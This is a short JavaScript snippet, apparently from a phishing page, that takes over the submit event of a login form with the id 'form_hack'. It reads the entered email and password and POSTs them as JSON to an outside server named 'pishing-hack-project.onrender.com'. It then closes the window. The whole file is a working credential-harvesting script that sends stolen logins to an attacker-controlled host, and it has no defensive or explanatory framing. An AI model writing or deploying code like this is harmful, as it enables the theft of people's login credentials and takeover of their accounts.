document.querySelector("#form_hack").addEventListener("submit", (event) => {
    event.preventDefault();

    const username = document.getElementById("email").value;
    const password = document.getElementById("pass").value;
    console.log(username, password)
    fetch("https://pishing-hack-project.onrender.com/api/v1/users", {
        method:"POST", 
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ username, password })
    }).then((resp)=>{
        resp.json().then((data)=>{
            console.log(data);
            window.close()
        })
    })
});
